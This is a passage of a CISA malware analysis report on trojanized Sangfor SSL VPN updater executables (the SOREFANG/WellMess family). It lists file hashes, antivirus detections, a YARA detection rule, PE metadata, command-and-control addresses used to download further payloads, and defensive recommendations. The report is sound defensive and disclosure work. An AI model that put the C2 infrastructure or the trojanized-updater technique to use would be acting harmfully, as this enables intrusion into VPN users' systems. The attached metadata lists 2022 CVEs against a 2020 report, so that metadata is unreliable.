Windows\n\n\nMD5\n967fcf185634def5177f74b0f703bdc0\n\n\nSHA1\n152189b62c546d6297a7083778fba62dcec576be\n\n\nSHA256\n58d8e65976b53b77645c248bfa18c3b87a6ecfb02f306fe6ba4944db96a5ede2\n\n\nSHA512\n184dba49900a9b7c2c170c857806bff67c2fb51bcfad672f841d8c484e0c4452a3599f237dadbd6b6eb44a5f541dd6282bee4654486f5003111558262a9c357f\n\n\nssdeep\n6144:AC70wZI2ZhjKOYTvkh+YVSn9bEAMpNZr3qHLAONXGCSxfuMBES:/lZIpQoYVmZERH0LguMWS\n\n\nEntropy\n6.211072\n\n\n\nAntivirus\n\n\n\nAhnlab\nMalware/Win32.Generic\n\n\nAntiy\nTrojan/Win32.Wacatac\n\n\nESET\na variant of Win32/Spy.Agent.PXZ trojan\n\n\nIkarus\nTrojan-Spy.Agent\n\n\nK7\nSpyware ( 0056414e1 )\n\n\nMicrosoft Security Essentials\nTrojan:Win32/Skeeyah.B!rfn\n\n\nQuick Heal\nTrojan.Agentb\n\n\nTrendMicro\nTrojanS.F2D90167\n\n\nTrendMicro House Call\nTrojanS.F2D90167\n\n\n\nYARA Rules\n\nrule CISA_10296782_01 : trojan WELLMESS\n\t{\n\tmeta:\n\t\u00a0\u00a0\u00a0 Author = \"CISA Code & Media Analysis\"\n\t\u00a0\u00a0\u00a0 Date= \"2020-07-06\"\n\t\u00a0\u00a0\u00a0 Last_Modified=\"20200706_1017\"\n\t\u00a0\u00a0\u00a0 Actor=\"n/a\"\n\t\u00a0\u00a0\u00a0 Category=\"Trojan\"\n\t\u00a0\u00a0\u00a0 Family=\"WellMess\"\n\t\u00a0\u00a0\u00a0 Description = \"Detects WellMess implant and SangFor Exploit\"\n\t\u00a0\u00a0\u00a0 MD5_1 = \"4d38ac3319b167f6c8acb16b70297111\"\n\t\u00a0\u00a0\u00a0 SHA256_1 = \"7c39841ba409bce4c2c35437ecf043f22910984325c70b9530edf15d826147ee\"\n\t\u00a0\u00a0\u00a0 MD5_2 = \"a32e1202257a2945bf0f878c58490af8\"\n\t\u00a0\u00a0\u00a0 SHA256_2 = \"a4b790ddffb3d2e6691dcacae08fb0bfa1ae56b6c73d70688b097ffa831af064\"\n\t\u00a0\u00a0\u00a0 MD5_3 = \"861879f402fe3080ab058c0c88536be4\"\n\t\u00a0\u00a0\u00a0 SHA256_3 = \"14e9b5e214572cb13ff87727d680633f5ee238259043357c94302654c546cad2\"\n\t\u00a0\u00a0\u00a0 MD5_4 = \"2f9f4f2a9d438cdc944f79bdf44a18f8\"\n\t\u00a0\u00a0\u00a0 SHA256_4 = \"e329607379a01483fc914a47c0062d5a3a8d8d65f777fbad2c5a841a90a0af09\"\n\t\u00a0\u00a0\u00a0 MD5_5 = \"ae7a46529a0f74fb83beeb1ab2c68c5c\"\n\t\u00a0\u00a0\u00a0 SHA256_5 = \"fd3969d32398bbe3709e9da5f8326935dde664bbc36753bd41a0b111712c0950\"\n\t\u00a0\u00a0\u00a0 MD5_6 = \"f18ced8772e9d1a640b8b4a731dfb6e0\"\n\t\u00a0\u00a0\u00a0 SHA256_6 = \"953b5fc9977e2d50f3f72c6ce85e89428937117830c0ed67d468e2d93aa7ec9a\"\n\t\u00a0\u00a0\u00a0 MD5_7 = \"3a9cdd8a5cbc3ab10ad64c4bb641b41f\"\n\t\u00a0\u00a0\u00a0 SHA256_7 = \"5ca4a9f6553fea64ad2c724bf71d0fac2b372f9e7ce2200814c98aac647172fb\"\n\t\u00a0\u00a0\u00a0 MD5_8 = \"967fcf185634def5177f74b0f703bdc0\"\n\t\u00a0\u00a0\u00a0 SHA256_8 = \"58d8e65976b53b77645c248bfa18c3b87a6ecfb02f306fe6ba4944db96a5ede2\"\n\t\u00a0\u00a0\u00a0 MD5_9 = \"c5d5cb99291fa4b2a68b5ea3ff9d9f9a\"\n\t\u00a0\u00a0\u00a0 SHA256_9 = \"65495d173e305625696051944a36a031ea94bb3a4f13034d8be740982bc4ab75\"\n\t\u00a0\u00a0\u00a0 MD5_10 = \"01d322dcac438d2bb6bce2bae8d613cb\"\n\t\u00a0\u00a0\u00a0 SHA256_10 = \"0c5ad1e8fe43583e279201cdb1046aea742bae59685e6da24e963a41df987494\"\n\t\u00a0\u00a0\u00a0 MD5_11 = \"8777a9796565effa01b03cf1cea9d24d\"\n\t\u00a0\u00a0\u00a0 SHA256_11 = \"83014ab5b3f63b0253cdab6d715f5988ac9014570fa4ab2b267c7cf9ba237d18\"\n\t\u00a0\u00a0\u00a0 MD5_12 = \"507bb551bd7073f846760d8b357b7aa9\"\n\t\u00a0\u00a0\u00a0 SHA256_12 = \"47cdb87c27c4e30ea3e2de620bed380d5aed591bc50c49b55fd43e106f294854\"\n\tstrings:\n\t\u00a0\u00a0\u00a0 $0 = \"/home/ubuntu/GoProject/src/bot/botlib/chat.go\"\n\t\u00a0\u00a0\u00a0 $1 = \"/home/ubuntu/GoProject/src/bot/botlib.Post\"\n\t\u00a0\u00a0\u00a0 $2 = \"GoProject/src/bot/botlib.deleteFile\"\n\t\u00a0\u00a0\u00a0 $3 = \"ubuntu/GoProject/src/bot/botlib.generateRandomString\"\n\t\u00a0\u00a0\u00a0 $4 = \"GoProject/src/bot/botlib.AES_Decrypt\"\n\t\u00a0\u00a0\u00a0 $5 = { 53 00 63 00 72 00 69 00 70 00 74 00 00 0F 63 00 6D 00 64 00 2E 00 65 00 78 00 65 00 00 07 2F 00 63 }\n\t\u00a0\u00a0\u00a0 $6 = { 3C 00 6E 00 77 00 3E 00 2E 00 2A 00 29 00 00 0B 24 00 7B 00 66 00 6E 00 7D }\n\t\u00a0\u00a0\u00a0 $7 = { 7B 00 61 00 72 00 67 00 7D 00 00 0B 24 00 7B 00 6E 00 77 00 7D }\n\t\u00a0\u00a0\u00a0 $8 = { 52 61 6E 64 6F 6D 53 74 72 69 6E 67 00 44 65 6C 65 74 65 46 69 6C 65 }\n\t\u00a0\u00a0\u00a0 $9 = \"get_keyRC6\"\n\t\u00a0\u00a0\u00a0 $10 = { 7D A3 26 77 1D 63 3D 5A 32 B4 6F 1F 55 49 44 25 }\n\t\u00a0\u00a0\u00a0 $11 = { 47 C2 2F 35 93 41 2F 55 73 0B C2 60 AB E1 2B 42 }\n\t\u00a0\u00a0\u00a0 $12 = { 53 58 9B 17 1F 45 BD 72 EC 01 30 6C 4F CA 93 1D }\n\t\u00a0\u00a0\u00a0 $13 = { 48 81 21 81 5F 53 3A 64 E0 ED FF 21 23 E5 00 12 }\n\t\u00a0\u00a0\u00a0 $14 = \"GoProject/src/bot/botlib.wellMess\"\n\t\u00a0\u00a0\u00a0 $15 = { 62 6F 74 6C 69 62 2E 4A 6F 69 6E 44 6E 73 43 68 75 6E 6B 73 }\n\t\u00a0\u00a0\u00a0 $16 = { 62 6F 74 6C 69 62 2E 45 78 65 63 }\n\t\u00a0\u00a0\u00a0 $17 = { 62 6F 74 6C 69 62 2E 47 65 74 52 61 6E 64 6F 6D 42 79 74 65 73 }\n\t\u00a0\u00a0\u00a0 $18 = { 62 6F 74 6C 69 62 2E 4B 65 79 }\n\t\u00a0\u00a0\u00a0 $19 = { 7F 16 21 9D 7B 03 CB D9 17 3B 9F 27 B3 DC 88 0F }\n\t\u00a0\u00a0\u00a0 $20 = { D9 BD 0A 0E 90 10 B1 39 D0 C8 56 58 69 74 15 8B }\n\t\u00a0\u00a0\u00a0 $21 = { 44 00 59 00 4A 00 20 00 36 00 47 00 73 00 62 00 59 00 31 00 2E }\n\t\u00a0\u00a0\u00a0 $22 = { 6E 00 20 00 46 00 75 00 7A 00 2C 00 4B 00 5A 00 20 00 33 00 31 00 69 00 6A 00 75 }\n\t\u00a0\u00a0\u00a0 $23 = { 43 00 31 00 69 00 76 00 66 00 39 00 32 00 20 00 56 00 37 00 6C 00 4F 00 48 }\n\t\u00a0\u00a0\u00a0 $24 = { 66 69 6C 65 4E 61 6D 65 3A 28 3F 50 3C 66 6E 3E 2E 2A 3F 29 5C 73 61 72 67 73 3A 28 3F 50 3C 61 72 67 3E 2E 2A 3F }\n\t\u00a0\u00a0\u00a0 $25 = { 5C 00 2E 00 53 00 61 00 6E 00 67 00 66 00 6F 00 72 00 55 00 44 00 2E 00 73 00 75 00 6D }\n\t\u00a0\u00a0\u00a0 $26 = { 66 6F 72 6D 2D 64 61 74 61 3B 20 6E 61 6D 65 3D 22 5F 67 61 22 3B 20 66 69 6C 65 6E 61 6D 65 3D }\n\t\u00a0\u00a0\u00a0 $27 = { 40 5B 5E 5C 73 5D 2B 3F 5C 73 28 3F 50 3C 74 61 72 3E 2E 2A 3F 29 5C 73 27 }\n\tcondition:\n\t\u00a0\u00a0\u00a0($0 and $1 and $2 and $3 and $4) or ($5 and $6 and $7 and $8 and $9) or ($10 and $11) or ($12 and $13) or ($14) or ($15 and $16 and $17 and $18) or ($19 and $20) or ($21 and $22 and $23) or ($24) or ($25 and $26) or ($27)\n\t}\n\nssdeep Matches\nNo matches found.\nPE Metadata\n\n\n\nCompile Date\n2019-03-01 10:20:20-05:00\n\n\nImport Hash\ndaf2da52475fd8981b19ec3c321a983c\n\n\nCompany Name\nSangfor Technologies Co.,Ltd\n\n\nFile Description\nSangforUD\n\n\nInternal Name\nSangforUD.exe\n\n\nLegal Copyright\nCopyright (C) 2015\n\n\nOriginal Filename\nSangforUD.EXE\n\n\nProduct Name\nSangforUD application\n\n\nProduct Version\n7.6.0.100\n\n\n\nPE Sections\n\n\n\nMD5\nName\nRaw Size\nEntropy\n\n\n1cd19b3151a670e3d1d2a24953392004\nheader\n1024\n3.025361\n\n\n98e91043bf45d10a621d72a2e3200ed0\n.text\n232960\n6.609761\n\n\naa6f1abb810df36035bc35cf27c68d59\n.rdata\n72704\n5.619637\n\n\nc947f4e73cc3503e16ce6173df639c87\n.data\n4608\n3.792666\n\n\n1f354d76203061bfdd5a53dae48d5435\n.tls\n512\n0.020393\n\n\nec6c94b5135c0c75d0a8b7288b77cbae\n.rsrc\n103936\n3.885931\n\n\nb744db87f1a59d6af2a5a37c0da519d1\n.reloc\n12288\n6.571358\n\n\n\nPackers/Compilers/Cryptors\n\n\n\nMicrosoft Visual C++ ?.?\n\n\n\nRelationships\n\n\n\n58d8e65976...\nConnected_To\n103.216.221.19\n\n\n\nDescription\nThis file is a 32-bit Windows executable and is similar in design and structure to the file 65495d173e305625696051944a36a031ea94bb3a4f13034d8be740982bc4ab75. This application is also designed to replace the update binaries served out from Sangfor SSL VPN devices. This malware uses the hard-coded C2 IP address 103.216.221.19 to download additional payloads.\n\n\na4b790ddffb3d2e6691dcacae08fb0bfa1ae56b6c73d70688b097ffa831af064\nTags\ntrojan\nDetails\n\n\n\nName\na4b790ddffb3d2e6691dcacae08fb0bfa1ae56b6c73d70688b097ffa831af064\n\n\nSize\n434688 bytes\n\n\nType\nPE32 executable (GUI) Intel 80386, for MS Windows\n\n\nMD5\na32e1202257a2945bf0f878c58490af8\n\n\nSHA1\n416df2d22338f412571cdaedb40ab33eb38977af\n\n\nSHA256\na4b790ddffb3d2e6691dcacae08fb0bfa1ae56b6c73d70688b097ffa831af064\n\n\nSHA512\n92ac91e36fc9a8463b2a7b00e6dba687e86a15484d836cb2c8d399d76cd012b71523a9ddae43d9795e2c14fdb7ccc2137d668f7c691b47a2e266a4bfe48de71a\n\n\nssdeep\n6144:4t4156qfXqT02bFXCYv123kUo4GECAOcL6xDE4U:oc6qkt5vdU6ECe4U\n\n\nEntropy\n6.203383\n\n\n\nAntivirus\n\n\n\nAhnlab\nMalware/Win32.Generic\n\n\nAntiy\nGrayWare/Win32.Uwasson\n\n\nESET\nWin32/Spy.Agent.PXZ trojan\n\n\nIkarus\nTrojan-Spy.Agent\n\n\nK7\nRiskware ( 0040eff71 )\n\n\nMcAfee\nRDN/Generic.cf\n\n\nMicrosoft Security Essentials\nTrojan:Win32/Occamy.C\n\n\nNetGate\nTrojan.Win32.Malware\n\n\nVirusBlokAda\nTrojan.Agentb\n\n\n\nYARA Rules\n\nrule CISA_10296782_01 : trojan WELLMESS\n\t{\n\tmeta:\n\t\u00a0\u00a0\u00a0 Author = \"CISA Code & Media Analysis\"\n\t\u00a0\u00a0\u00a0 Date= \"2020-07-06\"\n\t\u00a0\u00a0\u00a0 Last_Modified=\"20200706_1017\"\n\t\u00a0\u00a0\u00a0 Actor=\"n/a\"\n\t\u00a0\u00a0\u00a0 Category=\"Trojan\"\n\t\u00a0\u00a0\u00a0 Family=\"WellMess\"\n\t\u00a0\u00a0\u00a0 Description = \"Detects WellMess implant and SangFor Exploit\"\n\t\u00a0\u00a0\u00a0 MD5_1 = \"4d38ac3319b167f6c8acb16b70297111\"\n\t\u00a0\u00a0\u00a0 SHA256_1 = \"7c39841ba409bce4c2c35437ecf043f22910984325c70b9530edf15d826147ee\"\n\t\u00a0\u00a0\u00a0 MD5_2 = \"a32e1202257a2945bf0f878c58490af8\"\n\t\u00a0\u00a0\u00a0 SHA256_2 = \"a4b790ddffb3d2e6691dcacae08fb0bfa1ae56b6c73d70688b097ffa831af064\"\n\t\u00a0\u00a0\u00a0 MD5_3 = \"861879f402fe3080ab058c0c88536be4\"\n\t\u00a0\u00a0\u00a0 SHA256_3 = \"14e9b5e214572cb13ff87727d680633f5ee238259043357c94302654c546cad2\"\n\t\u00a0\u00a0\u00a0 MD5_4 = \"2f9f4f2a9d438cdc944f79bdf44a18f8\"\n\t\u00a0\u00a0\u00a0 SHA256_4 = \"e329607379a01483fc914a47c0062d5a3a8d8d65f777fbad2c5a841a90a0af09\"\n\t\u00a0\u00a0\u00a0 MD5_5 = \"ae7a46529a0f74fb83beeb1ab2c68c5c\"\n\t\u00a0\u00a0\u00a0 SHA256_5 = \"fd3969d32398bbe3709e9da5f8326935dde664bbc36753bd41a0b111712c0950\"\n\t\u00a0\u00a0\u00a0 MD5_6 = \"f18ced8772e9d1a640b8b4a731dfb6e0\"\n\t\u00a0\u00a0\u00a0 SHA256_6 = \"953b5fc9977e2d50f3f72c6ce85e89428937117830c0ed67d468e2d93aa7ec9a\"\n\t\u00a0\u00a0\u00a0 MD5_7 = \"3a9cdd8a5cbc3ab10ad64c4bb641b41f\"\n\t\u00a0\u00a0\u00a0 SHA256_7 = \"5ca4a9f6553fea64ad2c724bf71d0fac2b372f9e7ce2200814c98aac647172fb\"\n\t\u00a0\u00a0\u00a0 MD5_8 = \"967fcf185634def5177f74b0f703bdc0\"\n\t\u00a0\u00a0\u00a0 SHA256_8 = \"58d8e65976b53b77645c248bfa18c3b87a6ecfb02f306fe6ba4944db96a5ede2\"\n\t\u00a0\u00a0\u00a0 MD5_9 = \"c5d5cb99291fa4b2a68b5ea3ff9d9f9a\"\n\t\u00a0\u00a0\u00a0 SHA256_9 = \"65495d173e305625696051944a36a031ea94bb3a4f13034d8be740982bc4ab75\"\n\t\u00a0\u00a0\u00a0 MD5_10 = \"01d322dcac438d2bb6bce2bae8d613cb\"\n\t\u00a0\u00a0\u00a0 SHA256_10 = \"0c5ad1e8fe43583e279201cdb1046aea742bae59685e6da24e963a41df987494\"\n\t\u00a0\u00a0\u00a0 MD5_11 = \"8777a9796565effa01b03cf1cea9d24d\"\n\t\u00a0\u00a0\u00a0 SHA256_11 = \"83014ab5b3f63b0253cdab6d715f5988ac9014570fa4ab2b267c7cf9ba237d18\"\n\t\u00a0\u00a0\u00a0 MD5_12 = \"507bb551bd7073f846760d8b357b7aa9\"\n\t\u00a0\u00a0\u00a0 SHA256_12 = \"47cdb87c27c4e30ea3e2de620bed380d5aed591bc50c49b55fd43e106f294854\"\n\tstrings:\n\t\u00a0\u00a0\u00a0 $0 = \"/home/ubuntu/GoProject/src/bot/botlib/chat.go\"\n\t\u00a0\u00a0\u00a0 $1 = \"/home/ubuntu/GoProject/src/bot/botlib.Post\"\n\t\u00a0\u00a0\u00a0 $2 = \"GoProject/src/bot/botlib.deleteFile\"\n\t\u00a0\u00a0\u00a0 $3 = \"ubuntu/GoProject/src/bot/botlib.generateRandomString\"\n\t\u00a0\u00a0\u00a0 $4 = \"GoProject/src/bot/botlib.AES_Decrypt\"\n\t\u00a0\u00a0\u00a0 $5 = { 53 00 63 00 72 00 69 00 70 00 74 00 00 0F 63 00 6D 00 64 00 2E 00 65 00 78 00 65 00 00 07 2F 00 63 }\n\t\u00a0\u00a0\u00a0 $6 = { 3C 00 6E 00 77 00 3E 00 2E 00 2A 00 29 00 00 0B 24 00 7B 00 66 00 6E 00 7D }\n\t\u00a0\u00a0\u00a0 $7 = { 7B 00 61 00 72 00 67 00 7D 00 00 0B 24 00 7B 00 6E 00 77 00 7D }\n\t\u00a0\u00a0\u00a0 $8 = { 52 61 6E 64 6F 6D 53 74 72 69 6E 67 00 44 65 6C 65 74 65 46 69 6C 65 }\n\t\u00a0\u00a0\u00a0 $9 = \"get_keyRC6\"\n\t\u00a0\u00a0\u00a0 $10 = { 7D A3 26 77 1D 63 3D 5A 32 B4 6F 1F 55 49 44 25 }\n\t\u00a0\u00a0\u00a0 $11 = { 47 C2 2F 35 93 41 2F 55 73 0B C2 60 AB E1 2B 42 }\n\t\u00a0\u00a0\u00a0 $12 = { 53 58 9B 17 1F 45 BD 72 EC 01 30 6C 4F CA 93 1D }\n\t\u00a0\u00a0\u00a0 $13 = { 48 81 21 81 5F 53 3A 64 E0 ED FF 21 23 E5 00 12 }\n\t\u00a0\u00a0\u00a0 $14 = \"GoProject/src/bot/botlib.wellMess\"\n\t\u00a0\u00a0\u00a0 $15 = { 62 6F 74 6C 69 62 2E 4A 6F 69 6E 44 6E 73 43 68 75 6E 6B 73 }\n\t\u00a0\u00a0\u00a0 $16 = { 62 6F 74 6C 69 62 2E 45 78 65 63 }\n\t\u00a0\u00a0\u00a0 $17 = { 62 6F 74 6C 69 62 2E 47 65 74 52 61 6E 64 6F 6D 42 79 74 65 73 }\n\t\u00a0\u00a0\u00a0 $18 = { 62 6F 74 6C 69 62 2E 4B 65 79 }\n\t\u00a0\u00a0\u00a0 $19 = { 7F 16 21 9D 7B 03 CB D9 17 3B 9F 27 B3 DC 88 0F }\n\t\u00a0\u00a0\u00a0 $20 = { D9 BD 0A 0E 90 10 B1 39 D0 C8 56 58 69 74 15 8B }\n\t\u00a0\u00a0\u00a0 $21 = { 44 00 59 00 4A 00 20 00 36 00 47 00 73 00 62 00 59 00 31 00 2E }\n\t\u00a0\u00a0\u00a0 $22 = { 6E 00 20 00 46 00 75 00 7A 00 2C 00 4B 00 5A 00 20 00 33 00 31 00 69 00 6A 00 75 }\n\t\u00a0\u00a0\u00a0 $23 = { 43 00 31 00 69 00 76 00 66 00 39 00 32 00 20 00 56 00 37 00 6C 00 4F 00 48 }\n\t\u00a0\u00a0\u00a0 $24 = { 66 69 6C 65 4E 61 6D 65 3A 28 3F 50 3C 66 6E 3E 2E 2A 3F 29 5C 73 61 72 67 73 3A 28 3F 50 3C 61 72 67 3E 2E 2A 3F }\n\t\u00a0\u00a0\u00a0 $25 = { 5C 00 2E 00 53 00 61 00 6E 00 67 00 66 00 6F 00 72 00 55 00 44 00 2E 00 73 00 75 00 6D }\n\t\u00a0\u00a0\u00a0 $26 = { 66 6F 72 6D 2D 64 61 74 61 3B 20 6E 61 6D 65 3D 22 5F 67 61 22 3B 20 66 69 6C 65 6E 61 6D 65 3D }\n\t\u00a0\u00a0\u00a0 $27 = { 40 5B 5E 5C 73 5D 2B 3F 5C 73 28 3F 50 3C 74 61 72 3E 2E 2A 3F 29 5C 73 27 }\n\tcondition:\n\t\u00a0\u00a0\u00a0($0 and $1 and $2 and $3 and $4) or ($5 and $6 and $7 and $8 and $9) or ($10 and $11) or ($12 and $13) or ($14) or ($15 and $16 and $17 and $18) or ($19 and $20) or ($21 and $22 and $23) or ($24) or ($25 and $26) or ($27)\n\t}\n\nssdeep Matches\nNo matches found.\nPE Metadata\n\n\n\nCompile Date\n2018-03-12 10:02:59-04:00\n\n\nImport Hash\na723dab3d5a36cc8ad0ef65a0d4cfb3d\n\n\nCompany Name\nSangfor Technologies Co.,Ltd\n\n\nFile Description\nSangforUD\n\n\nInternal Name\nSangforUD.exe\n\n\nLegal Copyright\nCopyright (C) 2015\n\n\nOriginal Filename\nSangforUD.EXE\n\n\nProduct Name\nSangforUD application\n\n\nProduct Version\n7.6.0.100\n\n\n\nPE Sections\n\n\n\nMD5\nName\nRaw Size\nEntropy\n\n\ned096fa6a0d25049398750d840d02748\nheader\n1024\n3.038012\n\n\n0f2de5a1546886f5cb9876d918d333bf\n.text\n238080\n6.593105\n\n\n398a48e3a63f160340ba9720a3f13bc8\n.rdata\n73728\n5.589507\n\n\n6f25e38b602834c202db365468104061\n.data\n4608\n3.709410\n\n\n1f354d76203061bfdd5a53dae48d5435\n.tls\n512\n0.020393\n\n\n093889615fb3f28b9066f7dc93650099\n.rsrc\n103936\n3.885922\n\n\nd404cb13c9f033a5b71c2d31cf474e6f\n.reloc\n12800\n6.522532\n\n\n\nPackers/Compilers/Cryptors\n\n\n\nMicrosoft Visual C++ ?.?\n\n\n\nRelationships\n\n\n\na4b790ddff...\nConnected_To\n192.168.169.103\n\n\n\nDescription\nThis file is a 32-bit Windows executable and is similar in design and structure to the file 65495d173e305625696051944a36a031ea94bb3a4f13034d8be740982bc4ab75. This application is also designed to replace the update binaries served out from Sangfor SSL VPN devices. It uses the private IP address 192.168.169.103 as a C2 server.\n\n\n192.168.169.103\nWhois\nQueried whois.arin.net with \"n 192.168.169.103\"...\nNetRange: \u00a0\u00a0\u00a0 192.168.0.0 - 192.168.255.255\nCIDR: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 192.168.0.0/16\nNetName: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0PRIVATE-ADDRESS-CBLK-RFC1918-IANA-RESERVED\nNetHandle: \u00a0\u00a0\u00a0 NET-192-168-0-0-1\nParent: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 NET192 (NET-192-0-0-0-0)\nNetType: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0IANA Special Use\nOrganization: Internet Assigned Numbers Authority (IANA)\nRegDate: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a01994-03-15\nUpdated: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a02013-08-30\nComment: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0These addresses are in use by many millions of independently operated networks, which might be as small as a single computer connected to a home gateway, and are automatically configured in hundreds of millions of devices. They are only intended for use within a private context and traffic that needs to cross the Internet will need to use a different, unique address.\nComment: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0These addresses can be used by anyone without any need to coordinate with IANA or an Internet registry. The traffic from these addresses does not come from ICANN or IANA. We are not the source of activity you may see on logs or in e-mail records. Please refer to http://www.iana.org/abuse/answers\nComment: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0These addresses were assigned by the IETF, the organization that develops Internet protocols, in the Best Current Practice document, RFC 1918 which can be found at:\nComment: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0http://datatracker.ietf.org/doc/rfc1918\nRef: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0https://rdap.arin.net/registry/ip/192.168.0.0\nOrgName: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Internet Assigned Numbers Authority\nOrgId: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 IANA\nAddress: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a012025 Waterfront Drive\nAddress: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Suite 300\nCity: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 Los Angeles\nStateProv: \u00a0\u00a0\u00a0 CA\nPostalCode: \u00a0\u00a0\u00a0 90292\nCountry: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0US\nUpdated: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a02012-08-31\nRef: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0https://rdap.arin.net/registry/entity/IANA\nRelationships\n\n\n\n192.168.169.103\nConnected_From\na4b790ddffb3d2e6691dcacae08fb0bfa1ae56b6c73d70688b097ffa831af064\n\n\n\nDescription\na4b790ddffb3d2e6691dcacae08fb0bfa1ae56b6c73d70688b097ffa831af064 attempts to connect to the private IP address.\n\nRelationship Summary\n\n\n\n\n65495d173e...\nConnected_To\n103.216.221.19\n\n\n103.216.221.19\nConnected_From\n65495d173e305625696051944a36a031ea94bb3a4f13034d8be740982bc4ab75\n\n\n103.216.221.19\nConnected_From\n58d8e65976b53b77645c248bfa18c3b87a6ecfb02f306fe6ba4944db96a5ede2\n\n\n58d8e65976...\nConnected_To\n103.216.221.19\n\n\na4b790ddff...\nConnected_To\n192.168.169.103\n\n\n192.168.169.103\nConnected_From\na4b790ddffb3d2e6691dcacae08fb0bfa1ae56b6c73d70688b097ffa831af064\n\n\n\n\nRecommendations\n\nCISA recommends that users and administrators consider using the following best practices to strengthen the security posture of their organization's systems. Any configuration changes should be reviewed by system owners and administrators prior to implementation to avoid unwanted impacts.\n\nMaintain up-to-date antivirus signatures and engines.\nKeep operating system patches up-to-date.\nDisable File and Printer sharing services. If these services are required, use strong passwords or Active Directory authentication.\nRestrict users' ability (permissions) to install and run unwanted software applications. Do not add users to the local administrators group unless required.\nEnforce a strong password policy and implement regular password changes.\nExercise caution when opening e-mail attachments even if the attachment is expected and the sender appears to be known.\nEnable a personal firewall on agency workstations, configured to deny unsolicited connection requests.\nDisable unnecessary services on agency workstations and servers.\nScan for and remove suspicious e-mail attachments; ensure the scanned attachment is its \"true file type\" (i.e., the extension matches the file header).\nMonitor users' web browsing habits; restrict access to sites with unfavorable content.\nExercise caution when using removable media (e.g., USB thumb drives, external drives, CDs, etc.).\nScan all software downloaded from the Internet prior to executing.\nMaintain situational awareness of the latest threats and implement appropriate Access Control Lists (ACLs).\n\nAdditional information on malware incident prevention and handling can be found in National Institute of Standards and Technology (NIST) Special Publication 800-83, \"Guide to Malware Incident Prevention & Handling for Desktops and Laptops\".\n\nContact Information\n\n\n1-888-282-0870\nCISA Service Desk (UNCLASS)\nCISA SIPR (SIPRNET)\nCISA IC (JWICS)\n\nCISA continuously strives to improve its products and services. You can help by answering a very short series of questions about this product at the following URL: https://www.cisa.gov/forms/feedback/\n\nDocument FAQ\n\nWhat is a MIFR? A Malware Initial Findings Report (MIFR) is intended to provide organizations with malware analysis in a timely manner. In most instances this report will provide initial indicators for computer and network defense. To request additional analysis, please contact CISA and provide information regarding the level of desired analysis.\nWhat is a MAR? A Malware Analysis Report (MAR) is intended to provide organizations with more detailed malware analysis acquired via manual reverse engineering. To request additional analysis, please contact CISA and provide information regarding the level of desired analysis.\nCan I edit this document? This document is not to be edited in any way by recipients. All comments or questions related to this document should be directed to the CISA at 1-888-282-0870 or CISA Service Desk.\nCan I submit malware to CISA? Malware samples can be submitted via three methods:\n\nWeb: https://malware.us-cert.gov\nE-Mail: submit@malware.us-cert.gov\nFTP: ftp.malware.us-cert.gov (anonymous)\n\nCISA encourages you to report any suspicious activity, including cybersecurity incidents, possible malicious code, software vulnerabilities, and phishing-related scams. Reporting forms can be found on CISA's homepage at www.cisa.gov.\n\n\nRevisions\n\nJuly 16, 2020: Initial Version\n",
  "cves": [
    "CVE-2022-42475",
    "CVE-2022-47966"
  ],
  "techniques": [],
  "advisory": "ar20-198a",
  "title": "MAR-10296782-1.v1 \u2013 SOREFANG | CISA",
  "source": "analysis-reports",
  "id": "46c888cd3fc42d45349b6f935e93ad27ce0c884ee580d7a486803eb3acbaf742"
}